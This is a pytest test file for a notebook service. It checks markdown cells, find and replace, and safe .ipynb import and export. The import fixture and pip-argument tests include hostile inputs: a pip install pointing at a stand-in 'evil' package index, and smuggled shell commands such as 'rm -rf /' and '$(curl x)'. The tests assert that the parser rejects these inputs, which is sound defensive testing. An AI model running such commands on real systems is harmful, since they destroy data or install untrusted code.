import json

import pytest

from paper_env.domain import Author, CellStatus, EventType
from paper_env.services.ipynb import IpynbService, NotebookFormatError, parse_pip_args
from paper_env.services.notebook import NotebookService


@pytest.fixture
def nb(stack):
    env = stack.new_paper_env()
    svc = NotebookService(stack.uow, stack.bus)
    return svc, env, stack, IpynbService(stack.uow, stack.bus, svc, stack.envs)


def test_markdown_cells_never_go_stale_and_do_not_affect_code_cells(nb):
    svc, env, st, _ = nb
    code = svc.add_cell(env.id, "x = 1")
    md = svc.add_cell(env.id, "# Notes", cell_type="markdown")
    assert md.cell_type == "markdown" and md.declared_inputs == [] and md.input_warnings == []
    with st.uow() as u:
        c = u.cells.get_cell(code.id)
        c.status = CellStatus.SUCCESS
        u.cells.update_cell(c)
    svc.apply_edit(md.id, "# Notes v2", Author.HUMAN)
    assert svc.get_cell(code.id).status == CellStatus.SUCCESS  # editing documentation changes no results
    assert svc.get_cell(md.id).status == CellStatus.PENDING
    ev = [e for e in st.captured if e.type == EventType.CELL_EDITED][-1]
    assert ev.payload["stale_cells"] == []
    with pytest.raises(ValueError):
        svc.update_declarations(md.id, declared_inputs=["x"])


def test_find_is_literal_by_default_case_insensitive_and_regex_optional(nb):
    svc, env, *_ = nb
    a = svc.add_cell(env.id, "lr = 0.1\nprint('LR is', lr)")
    b = svc.add_cell(env.id, "Learning rate (lr) notes", cell_type="markdown")
    hits = svc.find(env.id, "lr")
    assert {(h["cell_id"], h["line"]) for h in hits} == {(a.id, 1), (a.id, 2), (b.id, 1)}
    assert len(svc.find(env.id, "LR", case=True)) == 1
    assert [h["line"] for h in svc.find(env.id, r"lr\s*=", regex=True)] == [1]
    assert svc.find(env.id, "a.b") == []  # '.' is literal when regex is off
    with pytest.raises(ValueError):
        svc.find(env.id, "(", regex=True)
    with pytest.raises(ValueError):
        svc.find(env.id, "")


def test_replace_all_goes_through_apply_edit_with_author_and_staleness(nb):
    svc, env, st, _ = nb
    a = svc.add_cell(env.id, "lr = 0.1\nlr2 = lr")
    b = svc.add_cell(env.id, "print(lr)")
    c = svc.add_cell(env.id, "nothing here")
    with st.uow() as u:
        for cid in (a.id, b.id, c.id):
            cell = u.cells.get_cell(cid)
            cell.status = CellStatus.SUCCESS
            u.cells.update_cell(cell)
    changed = svc.replace_all(env.id, "lr", "learning_rate", Author.AGENT)
    assert [x["cell_id"] for x in changed] == [a.id, b.id] and changed[0]["replacements"] == 3
    assert svc.source_of(a.id) == "learning_rate = 0.1\nlearning_rate2 = learning_rate"
    vs = svc.versions(a.id)
    assert [v.author for v in vs] == [Author.HUMAN, Author.AGENT] and "learning_rate" in vs[1].diff
    assert svc.get_cell(c.id).status == CellStatus.STALE  # downstream of an edited cell
    assert svc.replace_all(env.id, "zzz", "y", Author.HUMAN) == []
    # restricted to chosen cells, and replacement text is taken literally (backslashes are not escapes)
    d = svc.add_cell(env.id, "path = 'x'")
    svc.replace_all(env.id, "x", r"C:\dir\1", Author.HUMAN, cell_ids=[d.id])
    assert svc.source_of(d.id) == "path = 'C:\\dir\\1'"
    assert svc.source_of(b.id) == "print(learning_rate)"


def test_regex_replace_supports_groups(nb):
    svc, env, *_ = nb
    a = svc.add_cell(env.id, "seed = 1\nseed = 2")
    svc.replace_all(env.id, r"seed = (\d)", r"SEED = \1\1", Author.HUMAN, regex=True)
    assert svc.source_of(a.id) == "SEED = 11\nSEED = 22"


NOTEBOOK = {
    "nbformat": 4, "nbformat_minor": 5, "metadata": {},
    "cells": [
        {"cell_type": "markdown", "metadata": {}, "source": ["# Title\n", "text"]},
        {"cell_type": "raw", "metadata": {}, "source": "raw text"},
        {"cell_type": "code", "metadata": {"paper_env": {"declared_outputs": ["x"]}}, "outputs": [], "execution_count": None,
         "source": ["!pip install -q numpy==1.26.4 'pandas>=2' --index-url http://evil\n", "%pip install requests\n", "x = 1\n", "%matplotlib inline\n", "!ls -la\n"]},
        {"cell_type": "code", "metadata": {}, "outputs": [], "source": "print(x)"},
    ],
}


def test_import_never_executes_and_rewrites_pip_lines(nb):
    svc, env, st, ip = nb
    rep = ip.import_notebook(env.id, json.loads(json.dumps(NOTEBOOK)))
    assert (rep.cells_added, rep.markdown_cells) == (2, 2)
    assert rep.packages == ["numpy==1.26.4", "pandas>=2", "requests"]
    assert any("--index-url" in a for a in rep.unsupported_pip_args)  # source-changing flags are reported, never followed
    assert len(rep.rewritten_pip_lines) == 2
    assert [m["line"] for m in rep.skipped_magics] == ["!ls -la"] and any("magics" in w for w in rep.warnings)
    cells = svc.list_cells(env.id)
    assert [c.cell_type for c in cells] == ["markdown", "markdown", "code", "code"]
    first_code = svc.source_of(cells[2].id)
    assert not any(ln.lstrip().startswith(("!pip", "%pip")) for ln in first_code.splitlines())  # no live pip line survives
    assert "[removed on import]" in first_code
    assert "x = 1" in first_code and cells[2].declared_outputs == ["x"]
    assert svc.source_of(cells[0].id) == "# Title\ntext"
    assert not any(e.type in (EventType.ENV_CHANGED, EventType.CELL_STARTED) for e in st.captured)  # nothing ran or installed


def test_import_install_packages_goes_through_the_env_manager_and_hook(stack_factory, wheels):
    from paper_env.hooks import Decision

    class Ask:
        def check(self, a): return Decision.needs_approval("review installs")

    st = stack_factory(hook=Ask())
    env = st.new_paper_env()
    svc = NotebookService(st.uow, st.bus)
    ip = IpynbService(st.uow, st.bus, svc, st.envs)
    rep = ip.import_notebook(env.id, {"nbformat": 4, "cells": [{"cell_type": "code", "source": "!pip install demo_c==1.0\nx=1"}]},
                             install_packages=True)
    assert rep.installs[0]["status"] == "blocked" and rep.installs[0]["blocked_action_id"]  # the hook was consulted


@pytest.mark.parametrize("bad,msg", [({}, "cells"), ({"cells": "x"}, "cells"), ({"cells": [1]}, "not an object"),
                                     ({"nbformat": 3, "cells": []}, "nbformat 4"), ({"cells": [{"cell_type": "code", "source": "x" * 2_000_001}]}, "too large")])
def test_import_rejects_malformed_notebooks(nb, bad, msg):
    with pytest.raises(NotebookFormatError, match=msg):
        nb[3].import_notebook(nb[1].id, bad)


def test_pip_arg_parsing_edge_cases():
    assert parse_pip_args("-q --upgrade numpy") == (["numpy"], [])
    assert parse_pip_args("-r requirements.txt") == ([], ["-r requirements.txt"])
    assert parse_pip_args("git+https://x/y.git")[0] == []  # URLs / VCS are not plain requirements
    assert parse_pip_args("'unterminated")[0] == []
    for evil in ("numpy; echo hi", "numpy && rm -rf /", "numpy | tee x", "numpy > out", "$(curl x) numpy", "numpy & echo hi"):
        reqs, bad = parse_pip_args(evil)
        assert reqs == [] and bad == [evil], evil  # a line with shell operators is reported whole; no word becomes a package
    assert parse_pip_args("'pandas>=2' numpy")[0] == ["pandas>=2", "numpy"]  # quoted specifiers are fine


def test_export_contains_outputs_metadata_and_roundtrips(kstack):
    env = kstack.new_ready_env()
    kstack.add_cells(env, "print('hi')\n40 + 2", declared_outputs=["a"])
    kstack.notebook.add_cell(env.id, "## Notes", Author.HUMAN, cell_type="markdown")
    kstack.add_cells(env, "1/0")
    kstack.runs.run_all(env.id, stop_on_fail=False)
    nbd = kstack.ipynb.export_notebook(env.id) if hasattr(kstack, "ipynb") else None
    if nbd is None:
        from paper_env.services.ipynb import IpynbService
        nbd = IpynbService(kstack.uow, kstack.bus, kstack.notebook, kstack.envs).export_notebook(env.id)
    assert nbd["nbformat"] == 4 and nbd["metadata"]["paper_env"]["lockfile_hash"] == kstack.template["lockfile_hash"]
    kinds = [c["cell_type"] for c in nbd["cells"]]
    assert kinds == ["code", "markdown", "code"]
    outs = nbd["cells"][0]["outputs"]
    assert outs[0] == {"output_type": "stream", "name": "stdout", "text": "hi\n"}
    assert outs[1]["output_type"] == "execute_result" and outs[1]["data"]["text/plain"] == "42"
    assert nbd["cells"][2]["outputs"][-1]["ename"] == "ZeroDivisionError"
    assert nbd["cells"][0]["metadata"]["paper_env"]["declared_outputs"] == ["a"]
    json.dumps(nbd)  # serializable
    # no-outputs export, and a roundtrip import into a fresh env keeps the structure
    ip = IpynbService(kstack.uow, kstack.bus, kstack.notebook, kstack.envs)
    assert all(c.get("outputs", []) == [] for c in ip.export_notebook(env.id, include_outputs=False)["cells"])
    env2 = kstack.new_paper_env(alias="copy")
    rep = ip.import_notebook(env2.id, nbd)
    assert (rep.cells_added, rep.markdown_cells) == (2, 1)
    assert kstack.notebook.source_of(kstack.notebook.list_cells(env2.id)[0].id) == "print('hi')\n40 + 2"


def test_markdown_cells_are_skipped_by_runs_and_cannot_be_run(kstack):
    env = kstack.new_ready_env()
    a = kstack.add_cells(env, "x = 1")[0]
    md = kstack.notebook.add_cell(env.id, "# not code at all !!", Author.HUMAN, cell_type="markdown")
    b = kstack.add_cells(env, "print(x)")[0]
    run = kstack.runs.run_all(env.id)
    assert run.status.value == "success" and [c.cell_id for c in kstack.cell_runs(run)] == [a.id, b.id]
    until = kstack.runs.run_until(b.id)
    assert md.id not in [c.cell_id for c in kstack.cell_runs(until)]
    with pytest.raises(ValueError, match="markdown"):
        kstack.runs.run_cell(md.id)
    assert kstack.cell(md.id).status == CellStatus.PENDING
